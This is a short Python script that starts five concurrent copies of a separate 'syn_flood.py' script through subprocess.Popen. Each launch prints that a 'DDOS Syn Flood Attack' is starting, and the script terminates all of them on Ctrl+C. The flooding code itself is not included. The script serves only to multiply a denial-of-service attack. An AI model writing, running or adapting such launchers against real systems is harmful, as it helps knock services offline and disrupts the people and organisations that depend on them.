import subprocess
import time
import os

# Function to run a command with Popen and store the process in a list
def run_ddos_syn_flood(command, process_list):
    for i in range(5):
        print("[+] Starting DDOS Syn Flood Attack id: {}".format(i))
        process = subprocess.Popen(command)
        process_list.append(process)


# List to store the Popen processes
process_list = []

command = ['python3', 'syn_flood.py']
run_ddos_syn_flood(command, process_list)

print("Press CTRL+C to kill the running processes ...")

try:
    while(True):
        time.sleep(1)
except KeyboardInterrupt as e:
    # Terminate all the processes in the list
    for process in process_list:
        process.terminate()
        os.kill(process.pid, 9)  # Ensure the process is killed (optional)

    # Wait for all processes to terminate
    for process in process_list:
        process.wait()

    print("All processes terminated")

